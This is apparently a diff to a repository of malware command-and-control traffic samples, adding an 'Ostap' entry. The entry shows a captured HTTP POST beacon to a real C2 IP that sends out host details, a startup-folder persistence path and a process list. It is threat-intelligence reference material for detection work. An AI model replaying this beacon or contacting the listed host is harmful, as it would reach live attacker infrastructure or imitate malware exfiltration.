@@ -428,6 +428,60 @@ Machine name is SNI
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/orcus.png "Orcus RAT")
 
+#### Ostap
+~~~
+POST /angola/mabutu.php?pi=29h&tan=cezar&z=662343339&n=0&u=20&an=9468863238 HTTP/1.1
+Connection: Keep-Alive
+Content-Type: text/plain; Charset=UTF-8
+Accept: */*
+Accept-Language: en-US
+User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
+Content-Length: 1034
+Host: 185.180.199.91
+
+Microsoft Windows 7 Professional 6.1.7601*Locale:0409
+C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\sent64.jse
+USER-PC*DELL*DELL*0
+
+System Idle Process*null
+System*null
+smss.exe*null
+csrss.exe*null
+wininit.exe*null
+csrss.exe*null
+winlogon.exe*null
+services.exe*null
+lsass.exe*null
+lsm.exe*null
+svchost.exe*null
+svchost.exe*null
+svchost.exe*null
+svchost.exe*null
+svchost.exe*null
+svchost.exe*null
+svchost.exe*null
+spoolsv.exe*null
+svchost.exe*null
+svchost.exe*null
+svchost.exe*null
+dwm.exe*C:\Windows\system32\Dwm.exe
+explorer.exe*C:\Windows\Explorer.EXE
+taskhost.exe*C:\Windows\system32\taskhost.exe
+SearchIndexer.exe*null
+qemu-ga.exe*null
+audiodg.exe*null
+WmiPrvSE.exe*null
+SearchProtocolHost.exe*null
+windanr.exe*C:\Windows\system32\windanr.exe
+OSPPSVC.EXE*null
+wscript.exe*C:\Windows\system32\wscript.exe
+wscript.exe*C:\Windows\system32\wscript.exe
+SearchFilterHost.exe*null
+WINWORD.EXE*C:\Program Files\Microsoft Office\Office14\WINWORD.EXE
+WmiPrvSE.exe*null
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ostap.png "Ostap")
+
 #### Pony
 Follow tcp stream, not http stream in wireshark
 ~~~
